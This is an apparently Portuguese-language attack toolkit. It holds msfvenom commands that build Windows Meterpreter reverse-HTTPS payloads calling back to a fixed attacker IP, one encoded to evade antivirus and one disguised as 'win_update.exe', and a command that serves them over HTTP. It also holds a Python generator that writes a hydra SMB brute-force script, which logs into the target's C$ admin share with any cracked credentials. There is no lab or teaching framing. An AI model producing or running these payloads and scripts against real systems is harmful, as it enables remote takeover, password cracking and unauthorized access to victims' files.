msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -e x86/shikata_ga_nai -i 10 -f exe -o payload_encoded.exe

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f exe -o ~/win_update.exe

msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f psh-cmd -o payload.ps1

python3 -m http.server 8080

# Gerando o script Python para brute force SMB + conexão automática via smbclient

script_content_smb = """
import subprocess

ip_alvo = "192.168.1.84"  # IP alvo
userlist_path = "users_atibaia.txt"  # Lista de usuários
wordlist_path = "wordlist_atibaia.txt"  # Lista de senhas

print(f"Iniciando brute force SMB contra {ip_alvo}...\\n")

# Executa brute force via hydra
comando = [
    "hydra",
    "-L", userlist_path,
    "-P", wordlist_path,
    "-t", "1",
    "-V",
    f"smb://{ip_alvo}"
]

resultado = subprocess.run(comando, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

# Se encontrar a senha no output do hydra
for linha in resultado.stdout.splitlines():
    if "login:" in linha and "password:" in linha:
        print("\\n====> Usuário e senha encontrados! Resultado:")
        print(linha)
        
        # Extrair usuário e senha
        partes = linha.split()
        usuario = None
        senha = None
        for i, parte in enumerate(partes):
            if parte.startswith("login:"):
                usuario = parte.split("login:")[1]
            if parte.startswith("password:"):
                senha = parte.split("password:")[1]

        if usuario and senha:
            print(f"Conectando automaticamente com smbclient usando {usuario}:{senha}")
            subprocess.Popen(["smbclient", f"//{ip_alvo}/C$", "-U", usuario, f"-W", "WORKGROUP"], stdin=subprocess.PIPE).communicate(input=f"{senha}\\n".encode())
        else:
            print("Usuário ou senha não puderam ser extraídos automaticamente, verifique manualmente.")
        break
else:
    print("Nenhuma combinação encontrada ou tentativa falhou.")

print("Brute force SMB concluído.")
"""

with open("/mnt/data/bruteforce_smb_ready.py", "w") as f:
    f.write(script_content_smb)

print("Script pronto criado como 'bruteforce_smb_ready.py'.")




